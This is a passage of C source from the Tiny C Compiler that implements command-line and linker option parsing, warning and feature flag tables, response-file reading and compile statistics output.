            ignoring = 1;
#endif
        }
        else if (ret = link_option(option, "?whole-archive", &p), ret)
        {
            if (ret > 0)
                s->filetype |= AFF_WHOLE_ARCHIVE;
            else
                s->filetype &= ~AFF_WHOLE_ARCHIVE;
        }
        else if (link_option(option, "z=", &p))
        {
            ignoring = 1;
        }
        else if (p)
        {
            return 0;
        }
        else
        {
        err:
            tcc_error("unsupported linker option '%s'", option);
        }
        if (ignoring)
            tcc_warning_c(warn_unsupported)("unsupported linker option '%s'", option);
        option = skip_linker_arg(&p);
    }
    return 1;
}

typedef struct TCCOption
{
    const char *name;
    uint16_t index;
    uint16_t flags;
} TCCOption;

enum
{
    TCC_OPTION_ignored = 0,
    TCC_OPTION_HELP,
    TCC_OPTION_HELP2,
    TCC_OPTION_v,
    TCC_OPTION_I,
    TCC_OPTION_D,
    TCC_OPTION_U,
    TCC_OPTION_P,
    TCC_OPTION_L,
    TCC_OPTION_B,
    TCC_OPTION_l,
    TCC_OPTION_bench,
    TCC_OPTION_bt,
    TCC_OPTION_b,
    TCC_OPTION_ba,
    TCC_OPTION_g,
    TCC_OPTION_c,
    TCC_OPTION_dumpversion,
    TCC_OPTION_d,
    TCC_OPTION_static,
    TCC_OPTION_std,
    TCC_OPTION_shared,
    TCC_OPTION_soname,
    TCC_OPTION_o,
    TCC_OPTION_r,
    TCC_OPTION_Wl,
    TCC_OPTION_Wp,
    TCC_OPTION_W,
    TCC_OPTION_O,
    TCC_OPTION_mfloat_abi,
    TCC_OPTION_m,
    TCC_OPTION_f,
    TCC_OPTION_isystem,
    TCC_OPTION_iwithprefix,
    TCC_OPTION_include,
    TCC_OPTION_nostdinc,
    TCC_OPTION_nostdlib,
    TCC_OPTION_print_search_dirs,
    TCC_OPTION_rdynamic,
    TCC_OPTION_pthread,
    TCC_OPTION_run,
    TCC_OPTION_w,
    TCC_OPTION_E,
    TCC_OPTION_M,
    TCC_OPTION_MD,
    TCC_OPTION_MF,
    TCC_OPTION_MM,
    TCC_OPTION_MMD,
    TCC_OPTION_x,
    TCC_OPTION_ar,
    TCC_OPTION_impdef,
    TCC_OPTION_dynamiclib,
    TCC_OPTION_flat_namespace,
    TCC_OPTION_two_levelnamespace,
    TCC_OPTION_undefined,
    TCC_OPTION_install_name,
    TCC_OPTION_compatibility_version,
    TCC_OPTION_current_version,
};

#define TCC_OPTION_HAS_ARG 0x0001
#define TCC_OPTION_NOSEP 0x0002 /* cannot have space before option and arg */

static const TCCOption tcc_options[] = {
    {"h", TCC_OPTION_HELP, 0},
    {"-help", TCC_OPTION_HELP, 0},
    {"?", TCC_OPTION_HELP, 0},
    {"hh", TCC_OPTION_HELP2, 0},
    {"v", TCC_OPTION_v, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"-version", TCC_OPTION_v, 0}, /* handle as verbose, also prints version*/
    {"I", TCC_OPTION_I, TCC_OPTION_HAS_ARG},
    {"D", TCC_OPTION_D, TCC_OPTION_HAS_ARG},
    {"U", TCC_OPTION_U, TCC_OPTION_HAS_ARG},
    {"P", TCC_OPTION_P, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"L", TCC_OPTION_L, TCC_OPTION_HAS_ARG},
    {"B", TCC_OPTION_B, TCC_OPTION_HAS_ARG},
    {"l", TCC_OPTION_l, TCC_OPTION_HAS_ARG},
    {"bench", TCC_OPTION_bench, 0},
#ifdef CONFIG_TCC_BACKTRACE
    {"bt", TCC_OPTION_bt, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
#endif
#ifdef CONFIG_TCC_BCHECK
    {"b", TCC_OPTION_b, 0},
#endif
    {"g", TCC_OPTION_g, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
#ifdef TCC_TARGET_MACHO
    {"compatibility_version", TCC_OPTION_compatibility_version, TCC_OPTION_HAS_ARG},
    {"current_version", TCC_OPTION_current_version, TCC_OPTION_HAS_ARG},
#endif
    {"c", TCC_OPTION_c, 0},
#ifdef TCC_TARGET_MACHO
    {"dynamiclib", TCC_OPTION_dynamiclib, 0},
#endif
    {"dumpversion", TCC_OPTION_dumpversion, 0},
    {"d", TCC_OPTION_d, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"static", TCC_OPTION_static, 0},
    {"std", TCC_OPTION_std, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"shared", TCC_OPTION_shared, 0},
    {"soname", TCC_OPTION_soname, TCC_OPTION_HAS_ARG},
    {"o", TCC_OPTION_o, TCC_OPTION_HAS_ARG},
    {"pthread", TCC_OPTION_pthread, 0},
    {"run", TCC_OPTION_run, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"rdynamic", TCC_OPTION_rdynamic, 0},
    {"r", TCC_OPTION_r, 0},
    {"Wl,", TCC_OPTION_Wl, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"Wp,", TCC_OPTION_Wp, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"W", TCC_OPTION_W, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"O", TCC_OPTION_O, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
#ifdef TCC_TARGET_ARM
    {"mfloat-abi", TCC_OPTION_mfloat_abi, TCC_OPTION_HAS_ARG},
#endif
    {"m", TCC_OPTION_m, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
#ifdef TCC_TARGET_MACHO
    {"flat_namespace", TCC_OPTION_flat_namespace, 0},
#endif
    {"f", TCC_OPTION_f, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},
    {"isystem", TCC_OPTION_isystem, TCC_OPTION_HAS_ARG},
    {"include", TCC_OPTION_include, TCC_OPTION_HAS_ARG},
    {"nostdinc", TCC_OPTION_nostdinc, 0},
    {"nostdlib", TCC_OPTION_nostdlib, 0},
    {"print-search-dirs", TCC_OPTION_print_search_dirs, 0},
    {"w", TCC_OPTION_w, 0},
    {"E", TCC_OPTION_E, 0},
    {"M", TCC_OPTION_M, 0},
    {"MD", TCC_OPTION_MD, 0},
    {"MF", TCC_OPTION_MF, TCC_OPTION_HAS_ARG},
    {"MM", TCC_OPTION_MM, 0},
    {"MMD", TCC_OPTION_MMD, 0},
    {"x", TCC_OPTION_x, TCC_OPTION_HAS_ARG},
    {"ar", TCC_OPTION_ar, 0},
#ifdef TCC_TARGET_PE
    {"impdef", TCC_OPTION_impdef, 0},
#endif
#ifdef TCC_TARGET_MACHO
    {"install_name", TCC_OPTION_install_name, TCC_OPTION_HAS_ARG},
    {"two_levelnamespace", TCC_OPTION_two_levelnamespace, 0},
    {"undefined", TCC_OPTION_undefined, TCC_OPTION_HAS_ARG},
#endif
    /* ignored (silently, except after -Wunsupported) */
    {"arch", 0, TCC_OPTION_HAS_ARG},
    {"C", 0, 0},
    {"-param", 0, TCC_OPTION_HAS_ARG},
    {"pedantic", 0, 0},
    {"pipe", 0, 0},
    {"s", 0, 0},
    {"traditional", 0, 0},
    {NULL, 0, 0},
};

typedef struct FlagDef
{
    uint16_t offset;
    uint16_t flags;
    const char *name;
} FlagDef;

#define WD_ALL 0x0001    /* warning is activated when using -Wall */
#define FD_INVERT 0x0002 /* invert value before storing */

static const FlagDef options_W[] = {
    {offsetof(TCCState, warn_all), WD_ALL, "all"},
    {offsetof(TCCState, warn_error), 0, "error"},
    {offsetof(TCCState, warn_write_strings), 0, "write-strings"},
    {offsetof(TCCState, warn_unsupported), 0, "unsupported"},
    {offsetof(TCCState, warn_implicit_function_declaration), WD_ALL, "implicit-function-declaration"},
    {offsetof(TCCState, warn_discarded_qualifiers), WD_ALL, "discarded-qualifiers"},
    {0, 0, NULL}};

static const FlagDef options_f[] = {
    {offsetof(TCCState, char_is_unsigned), 0, "unsigned-char"},
    {offsetof(TCCState, char_is_unsigned), FD_INVERT, "signed-char"},
    {offsetof(TCCState, nocommon), FD_INVERT, "common"},
    {offsetof(TCCState, leading_underscore), 0, "leading-underscore"},
    {offsetof(TCCState, ms_extensions), 0, "ms-extensions"},
    {offsetof(TCCState, dollars_in_identifiers), 0, "dollars-in-identifiers"},
    {offsetof(TCCState, test_coverage), 0, "test-coverage"},
    {0, 0, NULL}};

static const FlagDef options_m[] = {
    {offsetof(TCCState, ms_bitfields), 0, "ms-bitfields"},
#ifdef TCC_TARGET_X86_64
    {offsetof(TCCState, nosse), FD_INVERT, "sse"},
#endif
    {0, 0, NULL}};

static int set_flag(TCCState *s, const FlagDef *flags, const char *name)
{
    int value, mask, ret;
    const FlagDef *p;
    const char *r;
    unsigned char *f;

    r = name, value = !strstart("no-", &r), mask = 0;

    /* when called with options_W, look for -W[no-]error=<option> */
    if ((flags->flags & WD_ALL) && strstart("error=", &r))
        value = value ? WARN_ON | WARN_ERR : WARN_NOE, mask = WARN_ON;

    for (ret = -1, p = flags; p->name; ++p)
    {
        if (ret)
        {
            if (strcmp(r, p->name))
                continue;
        }
        else
        {
            if (0 == (p->flags & WD_ALL))
                continue;
        }

        f = (unsigned char *)s + p->offset;
        *f = (*f & mask) | (value ^ !!(p->flags & FD_INVERT));

        if (ret)
        {
            ret = 0;
            if (strcmp(r, "all"))
                break;
        }
    }
    return ret;
}

static int args_parser_make_argv(const char *r, int *argc, char ***argv)
{
    int ret = 0, q, c;
    CString str;
    for (;;)
    {
        while (c = (unsigned char)*r, c && c <= ' ')
            ++r;
        if (c == 0)
            break;
        q = 0;
        cstr_new(&str);
        while (c = (unsigned char)*r, c)
        {
            ++r;
            if (c == '\\' && (*r == '"' || *r == '\\'))
            {
                c = *r++;
            }
            else if (c == '"')
            {
                q = !q;
                continue;
            }
            else if (q == 0 && c <= ' ')
            {
                break;
            }
            cstr_ccat(&str, c);
        }
        cstr_ccat(&str, 0);
        // printf("<%s>\n", str.data), fflush(stdout);
        dynarray_add(argv, argc, tcc_strdup(str.data));
        cstr_free(&str);
        ++ret;
    }
    return ret;
}

/* read list file */
static void args_parser_listfile(TCCState *s,
                                 const char *filename, int optind, int *pargc, char ***pargv)
{
    TCCState *s1 = s;
    int fd, i;
    char *p;
    int argc = 0;
    char **argv = NULL;

    fd = open(filename, O_RDONLY | O_BINARY);
    if (fd < 0)
        tcc_error("listfile '%s' not found", filename);

    p = tcc_load_text(fd);
    for (i = 0; i < *pargc; ++i)
        if (i == optind)
            args_parser_make_argv(p, &argc, &argv);
        else
            dynarray_add(&argv, &argc, tcc_strdup((*pargv)[i]));

    tcc_free(p);
    dynarray_reset(&s->argv, &s->argc);
    *pargc = s->argc = argc, *pargv = s->argv = argv;
}

#if defined TCC_TARGET_MACHO
static uint32_t parse_version(TCCState *s1, const char *version)
{
    uint32_t a = 0;
    uint32_t b = 0;
    uint32_t c = 0;
    char *last;

    a = strtoul(version, &last, 10);
    if (*last == '.')
    {
        b = strtoul(&last[1], &last, 10);
        if (*last == '.')
            c = strtoul(&last[1], &last, 10);
    }
    if (*last || a > 0xffff || b > 0xff || c > 0xff)
        tcc_error("version a.b.c not correct: %s", version);
    return (a << 16) | (b << 8) | c;
}
#endif

PUB_FUNC int tcc_parse_args(TCCState *s, int *pargc, char ***pargv, int optind)
{
    TCCState *s1 = s;
    const TCCOption *popt;
    const char *optarg, *r;
    const char *run = NULL;
    int x;
    CString linker_arg; /* collect -Wl options */
    int tool = 0, arg_start = 0, noaction = optind;
    char **argv = *pargv;
    int argc = *pargc;

    cstr_new(&linker_arg);

    while (optind < argc)
    {
        r = argv[optind];
        if (r[0] == '@' && r[1] != '\0')
        {
            args_parser_listfile(s, r + 1, optind, &argc, &argv);
            continue;
        }
        optind++;
        if (tool)
        {
            if (r[0] == '-' && r[1] == 'v' && r[2] == 0)
                ++s->verbose;
            continue;
        }
    reparse:
        if (r[0] != '-' || r[1] == '\0')
        {
            if (r[0] != '@') /* allow "tcc file(s) -run @ args ..." */
                args_parser_add_file(s, r, s->filetype);
            if (run)
            {
                tcc_set_options(s, run);
                arg_start = optind - 1;
                break;
            }
            continue;
        }

        /* find option in table */
        for (popt = tcc_options;; ++popt)
        {
            const char *p1 = popt->name;
            const char *r1 = r + 1;
            if (p1 == NULL)
                tcc_error("invalid option -- '%s'", r);
            if (!strstart(p1, &r1))
                continue;
            optarg = r1;
            if (popt->flags & TCC_OPTION_HAS_ARG)
            {
                if (*r1 == '\0' && !(popt->flags & TCC_OPTION_NOSEP))
                {
                    if (optind >= argc)
                    arg_err:
                        tcc_error("argument to '%s' is missing", r);
                    optarg = argv[optind++];
                }
            }
            else if (*r1 != '\0')
                continue;
            break;
        }

        switch (popt->index)
        {
        case TCC_OPTION_HELP:
            x = OPT_HELP;
            goto extra_action;
        case TCC_OPTION_HELP2:
            x = OPT_HELP2;
            goto extra_action;
        case TCC_OPTION_I:
            tcc_add_include_path(s, optarg);
            break;
        case TCC_OPTION_D:
            tcc_define_symbol(s, optarg, NULL);
            break;
        case TCC_OPTION_U:
            tcc_undefine_symbol(s, optarg);
            break;
        case TCC_OPTION_L:
            tcc_add_library_path(s, optarg);
            break;
        case TCC_OPTION_B:
            /* set tcc utilities path (mainly for tcc development) */
            tcc_set_lib_path(s, optarg);
            ++noaction;
            break;
        case TCC_OPTION_l:
            args_parser_add_file(s, optarg, AFF_TYPE_LIB | (s->filetype & ~AFF_TYPE_MASK));
            s->nb_libraries++;
            break;
        case TCC_OPTION_pthread:
            s->option_pthread = 1;
            break;
        case TCC_OPTION_bench:
            s->do_bench = 1;
            break;
#ifdef CONFIG_TCC_BACKTRACE
        case TCC_OPTION_bt:
            s->rt_num_callers = atoi(optarg);
            s->do_backtrace = 1;
            s->do_debug = 1;
            s->dwarf = DWARF_VERSION;
            break;
#endif
#ifdef CONFIG_TCC_BCHECK
        case TCC_OPTION_b:
            s->do_bounds_check = 1;
            s->do_backtrace = 1;
            s->do_debug = 1;
            s->dwarf = DWARF_VERSION;
            break;
#endif
        case TCC_OPTION_g:
            s->do_debug = 1;
            s->dwarf = DWARF_VERSION;

            if (strstart("dwarf", &optarg))
                s->dwarf = (*optarg) ? (0 - atoi(optarg)) : DEFAULT_DWARF_VERSION;
            break;
        case TCC_OPTION_c:
            x = TCC_OUTPUT_OBJ;
        set_output_type:
            if (s->output_type)
                tcc_warning("-%s: overriding compiler action already specified", popt->name);
            s->output_type = x;
            break;
        case TCC_OPTION_d:
            if (*optarg == 'D')
                s->dflag = 3;
            else if (*optarg == 'M')
                s->dflag = 7;
            else if (*optarg == 't')
                s->dflag = 16;
            else if (isnum(*optarg))
                s->g_debug |= atoi(optarg);
            else
                goto unsupported_option;
            break;
        case TCC_OPTION_static:
            s->static_link = 1;
            break;
        case TCC_OPTION_std:
            if (strcmp(optarg, "=c11") == 0)
                s->cversion = 201112;
            break;
        case TCC_OPTION_shared:
            x = TCC_OUTPUT_DLL;
            goto set_output_type;
        case TCC_OPTION_soname:
            s->soname = tcc_strdup(optarg);
            break;
        case TCC_OPTION_o:
            if (s->outfile)
            {
                tcc_warning("multiple -o option");
                tcc_free(s->outfile);
            }
            s->outfile = tcc_strdup(optarg);
            break;
        case TCC_OPTION_r:
            /* generate a .o merging several output files */
            s->option_r = 1;
            x = TCC_OUTPUT_OBJ;
            goto set_output_type;
        case TCC_OPTION_isystem:
            tcc_add_sysinclude_path(s, optarg);
            break;
        case TCC_OPTION_include:
            cstr_printf(&s->cmdline_incl, "#include \"%s\"\n", optarg);
            break;
        case TCC_OPTION_nostdinc:
            s->nostdinc = 1;
            break;
        case TCC_OPTION_nostdlib:
            s->nostdlib = 1;
            break;
        case TCC_OPTION_run:
#ifndef TCC_IS_NATIVE
            tcc_error("-run is not available in a cross compiler");
#endif
            run = optarg;
            x = TCC_OUTPUT_MEMORY;
            goto set_output_type;
        case TCC_OPTION_v:
            do
                ++s->verbose;
            while (*optarg++ == 'v');
            ++noaction;
            break;
        case TCC_OPTION_f:
            if (set_flag(s, options_f, optarg) < 0)
                goto unsupported_option;
            break;
#ifdef TCC_TARGET_ARM
        case TCC_OPTION_mfloat_abi:
            /* tcc doesn't support soft float yet */
            if (!strcmp(optarg, "softfp"))
            {
                s->float_abi = ARM_SOFTFP_FLOAT;
            }
            else if (!strcmp(optarg, "hard"))
                s->float_abi = ARM_HARD_FLOAT;
            else
                tcc_error("unsupported float abi '%s'", optarg);
            break;
#endif
        case TCC_OPTION_m:
            if (set_flag(s, options_m, optarg) < 0)
            {
                if (x = atoi(optarg), x != 32 && x != 64)
                    goto unsupported_option;
                if (PTR_SIZE != x / 8)
                    return x;
                ++noaction;
            }
            break;
        case TCC_OPTION_W:
            s->warn_none = 0;
            if (optarg[0] && set_flag(s, options_W, optarg) < 0)
                goto unsupported_option;
            break;
        case TCC_OPTION_w:
            s->warn_none = 1;
            break;
        case TCC_OPTION_rdynamic:
            s->rdynamic = 1;
            break;
        case TCC_OPTION_Wl:
            if (linker_arg.size)
                --linker_arg.size, cstr_ccat(&linker_arg, ',');
            cstr_cat(&linker_arg, optarg, 0);
            if (tcc_set_linker(s, linker_arg.data))
                cstr_free(&linker_arg);
            break;
        case TCC_OPTION_Wp:
            r = optarg;
            goto reparse;
        case TCC_OPTION_E:
            x = TCC_OUTPUT_PREPROCESS;
            goto set_output_type;
        case TCC_OPTION_P:
            s->Pflag = atoi(optarg) + 1;
            break;
        case TCC_OPTION_M:
            s->include_sys_deps = 1;
            // fall through
        case TCC_OPTION_MM:
            s->just_deps = 1;
            if (!s->deps_outfile)
                s->deps_outfile = tcc_strdup("-");
            // fall through
        case TCC_OPTION_MMD:
            s->gen_deps = 1;
            break;
        case TCC_OPTION_MD:
            s->gen_deps = 1;
            s->include_sys_deps = 1;
            break;
        case TCC_OPTION_MF:
            s->deps_outfile = tcc_strdup(optarg);
            break;
        case TCC_OPTION_dumpversion:
            printf("%s\n", TCC_VERSION);
            exit(0);
            break;
        case TCC_OPTION_x:
            x = 0;
            if (*optarg == 'c')
                x = AFF_TYPE_C;
            else if (*optarg == 'a')
                x = AFF_TYPE_ASMPP;
            else if (*optarg == 'b')
                x = AFF_TYPE_BIN;
            else if (*optarg == 'n')
                x = AFF_TYPE_NONE;
            else
                tcc_warning("unsupported language '%s'", optarg);
            s->filetype = x | (s->filetype & ~AFF_TYPE_MASK);
            break;
        case TCC_OPTION_O:
            s->optimize = atoi(optarg);
            break;
        case TCC_OPTION_print_search_dirs:
            x = OPT_PRINT_DIRS;
            goto extra_action;
        case TCC_OPTION_impdef:
            x = OPT_IMPDEF;
            goto extra_action;
#if defined TCC_TARGET_MACHO
        case TCC_OPTION_dynamiclib:
            x = TCC_OUTPUT_DLL;
            goto set_output_type;
        case TCC_OPTION_flat_namespace:
            break;
        case TCC_OPTION_two_levelnamespace:
            break;
        case TCC_OPTION_undefined:
            break;
        case TCC_OPTION_install_name:
            s->install_name = tcc_strdup(optarg);
            break;
        case TCC_OPTION_compatibility_version:
            s->compatibility_version = parse_version(s, optarg);
            break;
        case TCC_OPTION_current_version:
            s->current_version = parse_version(s, optarg);
            ;
            break;
#endif
        case TCC_OPTION_ar:
            x = OPT_AR;
        extra_action:
            arg_start = optind - 1;
            if (arg_start != noaction)
                tcc_error("cannot parse %s here", r);
            tool = x;
            break;
        default:
        unsupported_option:
            tcc_warning_c(warn_unsupported)("unsupported option '%s'", r);
            break;
        }
    }
    if (linker_arg.size)
    {
        r = linker_arg.data;
        goto arg_err;
    }
    *pargc = argc - arg_start;
    *pargv = argv + arg_start;
    if (tool)
        return tool;
    if (optind != noaction)
        return 0;
    if (s->verbose == 2)
        return OPT_PRINT_DIRS;
    if (s->verbose)
        return OPT_V;
    return OPT_HELP;
}

LIBTCCAPI void tcc_set_options(TCCState *s, const char *r)
{
    char **argv = NULL;
    int argc = 0;
    args_parser_make_argv(r, &argc, &argv);
    tcc_parse_args(s, &argc, &argv, 0);
    dynarray_reset(&argv, &argc);
}

PUB_FUNC void tcc_print_stats(TCCState *s1, unsigned total_time)
{
    if (!total_time)
        total_time = 1;
    fprintf(stderr, "# %d idents, %d lines, %u bytes\n"
                    "# %0.3f s, %u lines/s, %0.1f MB/s\n",
            total_idents, total_lines, total_bytes,
            (double)total_time / 1000,
            (unsigned)total_lines * 1000 / total_time,
            (double)total_bytes / 1000 / total_time);
    fprintf(stderr, "# text %u, data.rw %u, data.ro %u, bss %u bytes\n",
            s1->total_output[0],
            s1->total_output[1],
            s1->total_output[2],
            s1->total_output[3]);
#ifdef MEM_DEBUG
    fprintf(stderr, "# %d bytes memory used\n", mem_max_size);
#endif
}
